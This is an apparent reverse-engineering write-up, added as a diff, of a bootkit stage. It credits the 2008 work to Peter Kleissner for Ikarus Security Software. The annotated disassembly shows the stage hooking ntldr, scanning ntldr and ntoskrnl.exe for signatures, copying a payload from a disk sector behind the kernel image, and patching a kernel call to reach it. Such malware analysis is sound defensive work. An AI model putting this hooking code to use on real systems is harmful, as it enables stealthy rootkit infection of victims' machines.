@@ -1,0 +1,153 @@
+
+; gets called by ntldr (memory is relocated, protected mode):
+(0) [0x00422a6f] 0008:0000000000422a6f (unk. ctxt): call dword ptr ds:0x9f5fc								; ff15fcf50900
+(0) [0x00422a96] 0008:0000000000422a96 (unk. ctxt): lea eax, dword ptr ss:[ebp+0xfffff67c]	; 8d857cf6ffff
+
+0x000000000009f5fc <bogus+       0>:    0x0009f600
+
+	; infected code in ntldr is now:			@ntldr.26B9Fh
+	00046b9f: (  32 Bit Code   w   ): call dword ptr ds:0x9f5fc				; ff15fcf50900			=> this code calls us
+	00046ba5: (  32 Bit Code   inv ): cmp byte ptr ds:0x43aef8, 0x00	; 803df8ae430000
+	00046bac: (  32 Bit Code   inv ): jz .+0x00000007           			; 7407
+	00046bae: (  32 Bit Code   inv ): xor esi, esi              			; 33f6
+	00046bb0: (  32 Bit Code   inv ): jmp .+0x00000255          			; e955020000
+	
+	; and was original:										@ntldr.26B9Fh
+	00046b9f: (  32 Bit Code       ): mov esi, eax              			; 8bf0							=> at beginning of our code we will simulate this code
+	00046ba1: (  32 Bit Code       ): test esi, esi             			; 85f6
+	00046ba3: (  32 Bit Code       ): jz .+0x00000021           			; 7421
+	00046ba5: (  32 Bit Code       ): cmp byte ptr ds:0x43aef8, 0x00	; 803df8ae430000
+	00046bac: (  32 Bit Code       ): jz .+0x00000007           			; 7407
+
+; ------------------------------
+
+; in memory this module resides at (executed) address 9F600, disk.sector60
+; data used by this code is located at address 9F800, disk.sector61
+
+; 24.10.2008 18:57:28
+; reverse engineering done by Peter Kleissner for Ikarus Security Software
+
+
+; simulate original code with following lines
+Hook_ntldr:
+00000000  8BF0              mov esi,eax											; exec original code which was hooked	[eax = 0]
+00000002  85C0              test eax,eax										; exec original code which was hooked
+00000004  9C                pushfd													; store flags for later return of simulated result
+00000005  7505              jnz Hook_Handler								; if not matching we do not have to simulate the branch
+00000007  8344240421        add dword [esp+0x4],byte +0x21	; return EIP = +21h (like original code would have done it)
+
+; investigate in the ntldr
+Hook_Handler:
+0000000C  60                pushad													; store register content
+0000000D  FC                cld
+0000000E  8B7C2424          mov edi,[esp+0x24]							; get return eip value (= 0x00422a75 / 0x00422a96, depending on original code simulation few lines above)
+00000012  81E70000F0FF      and edi,0xfff00000							; get ntldr module base address (odd method)
+
+
+; scan ntldr for signature (we need to copy some system values from runtime ntldr)
+;   ++    C7 46 34 00 40 				... 		A1
+;         ==>   @ntldr.19A44h						=> and A1 located at @ntldr.19A51h
+;					==>   memory.0x00415915				=> and A1 located at memory.0x00415921
+;   edi = base address of module ntldr (= 0x00400000)
+00000018  B0C7              mov al,0xc7
+Scan_for_byte:
+0000001A  AE                scasb														; bad developer doesn't use rep prefix (pah)
+0000001B  75FD              jnz Scan_for_byte
+0000001D  813F46340040      cmp dword [edi],0x40003446
+00000023  75F5              jnz Scan_for_byte
+00000025  B0A1              mov al,0xa1
+Scan_for_byte_2:
+00000027  AE                scasb
+00000028  75FD              jnz Scan_for_byte_2
+
+	; what we have found is probably some load function in ntldr
+	0041591b: (                    ): mov word ptr ds:[esi+0x38], 0x0001	; 66c746380100
+	00415921: (                    ): mov eax, dword ptr ds:0x4682c4			; a1c4824600			at this address we refer to
+	00415926: (                    ): lea ecx, dword ptr ds:[eax+0x4]			; 8d4804
+	00415929: (                    ): mov edx, dword ptr ds:[ecx]					; 8b11
+	0041592b: (                    ): mov dword ptr ds:[esi], eax					; 8906
+	0041592d: (                    ): mov eax, dword ptr ss:[ebp+0x14]		; 8b4514
+	00415930: (                    ): mov dword ptr ds:[esi+0x4], edx			; 895604
+
+0000002A  8B37              mov esi,[edi]										; 0x004682c4 (like load code above)
+0000002C  8B36              mov esi,[esi]										; 
+0000002E  8B36              mov esi,[esi]										; [esi] = 0x8008a090   <-- some system memory table
+00000030  8B5E18            mov ebx,[esi+0x18]							; get base address of ntoskrnl (= 0x804d7000)
+00000033  8BEB              mov ebp,ebx											; store ntoskrnl.exe Module Address for later usage
+
+
+; scan ntoskrnl.exe for code pattern (NOT signature)
+;   ++    6A 4B 6A 19 89/E8 ?? ?? ?? ?? ?? ?? E8/??				??... means any value, /... means second choice for positive match
+;         ==>   @ntoskrnl.1CE87E0h
+;					==>   memory.0x80683ec9
+;   ++    E8 ?? ?? ?? ?? 84 C0
+;         ==>   @ntoskrnl.1CE87F3h						==>   @ntoskrnl.1CE87F8h
+;					==>   memory.0x80683ed8							==>   memory.0x80683EDD
+Scan_ntoskrnl_code_pattern:
+00000035  43                inc ebx													; next byte
+00000036  813B6A4B6A19      cmp dword [ebx],0x196a4b6a
+0000003C  75F7              jnz Scan_ntoskrnl_code_pattern
+0000003E  807B0489          cmp byte [ebx+0x4],0x89
+00000042  7503              jnz Some_loop_part1_sigset			; we have 2 possible signatures (of sig 1)
+00000044  83C306            add ebx,byte +0x6
+Some_loop_part1_sigset:
+00000047  807B04E8          cmp byte [ebx+0x4],0xe8
+0000004B  75E8              jnz Scan_ntoskrnl_code_pattern
+0000004D  8D7B09            lea edi,[ebx+0x9]								; skip 9 bytes of the function code
+00000050  B0E8              mov al,0xe8											; we look for a call near instruction
+Some_loop_part2:
+00000052  AE                scasb
+00000053  75FD              jnz Some_loop_part2
+00000055  66817F0484C0      cmp word [edi+0x4],0xc084				; if sig 2 not matching, search for sig 1
+0000005B  75D8              jnz Scan_ntoskrnl_code_pattern
+
+
+; found function in ntoskrnl, found a call near instruction there we will use for hook later
+;   edi = address of call near instruction (= 0x80683ed9), offset set to target RELATIVE address (= 0x00001459)
+0000005D  8B17              mov edx,[edi]
+0000005F  8D543A04          lea edx,[edx+edi+0x4]						; we calculate back the absolute calling address for our hook code to simulate the call
+
+; get address of next stage hook, data sector 2, sector 61 on disk
+00000063  E800000000        call dword Get_EIP							; get EIP
+Get_EIP:
+00000068  58                pop eax
+00000069  660DFF01          or ax,0x1ff
+0000006D  40                inc eax													; eax = pointer to data (data sector 2, sector 61 on disk)
+
+; correct the next hook code (to store original call address and ntoskrnl address)
+0000006E  895004            mov [eax+0x4],edx								; [9f804h] = 80685336 .. find out what module ntoskrnl is calling here for!
+00000071  89680C            mov [eax+0xc],ebp								; [9f80Ch] = 804d7000   Module Address of ntoskrnl
+
+
+; now write our next stage code after ntoskrnl.exe
+;   eax = address of our next stage hook, disk.sector61
+;   ebp = Module Address of ntoskrnl.exe
+00000074  57                push edi
+00000075  8B753C            mov esi,[ebp+0x3c]							; PE Header address
+00000078  8B743550          mov esi,[ebp+esi+0x50]					; SizeOfImage; size of ntoskrnl = 0x001f6b80
+0000007C  03F5              add esi,ebp											; absolute end address = 0x806cdb80
+0000007E  4E                dec esi
+0000007F  81CEFF0F0000      or esi,0xfff
+00000085  81EEFF010000      sub esi,0x1ff										; alignment of end address to E00 (512)
+; *** PROGRAMMING ERROR ***
+; ** YOU CAN NOT ASSUME THIS IS THE TOTAL IMAGE SIZE **
+0000008B  8BFE              mov edi,esi											; -> target address (directly after ntoskrnl)
+0000008D  96                xchg eax,esi										; -> source is stage 3 hook, the sector
+0000008E  B980000000        mov ecx,0x80
+00000093  F3A5              rep movsd												; copy the 512 bytes
+00000095  5F                pop edi
+
+
+; now hook kernel mode code (kernel module ntoskrnl.exe)
+;   eax = target address of our hook code
+;   edi = points to jump instruction in a function of ntoskrnl
+00000096  2BC7              sub eax,edi											; let's calculat the relative jump address (target - source)
+00000098  83E804            sub eax,byte +0x4								; oddly enough but subtract 4 bytes of call near instruction opcode
+0000009B  AB                stosd														; store the to address to jump opcode
+
+
+; return from our ntldr hooked code
+0000009C  61                popad														; restore register content and
+0000009D  9D                popfd														; set simulated flags of simulated original code
+0000009E  C3                ret
+
